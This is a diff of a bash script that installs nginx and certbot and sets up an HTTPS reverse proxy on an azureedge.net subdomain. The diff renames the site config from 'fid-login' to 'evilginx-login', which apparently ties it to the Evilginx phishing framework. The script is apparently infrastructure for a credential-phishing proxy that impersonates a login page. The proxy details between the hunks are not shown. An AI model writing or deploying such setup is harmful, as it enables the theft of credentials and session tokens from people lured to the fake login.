@@ -9,7 +9,7 @@ FULL_DOMAIN=$2
 sudo apt-get update && sudo apt-get install -y nginx certbot python3-certbot-nginx
 
 # Configure Nginx Reverse Proxy
-cat > /etc/nginx/sites-available/fid-login <<EOF
+cat > /etc/nginx/sites-available/evilginx-login <<EOF
 server {
     listen 443 ssl;
     server_name ${DOMAIN}.azureedge.net;
@@ -66,5 +66,5 @@ server {
 EOF
 
 # Enable and Restart Nginx
-sudo ln -sf /etc/nginx/sites-available/fid-login /etc/nginx/sites-enabled/
+sudo ln -sf /etc/nginx/sites-available/evilginx-login /etc/nginx/sites-enabled/
 sudo systemctl restart nginx
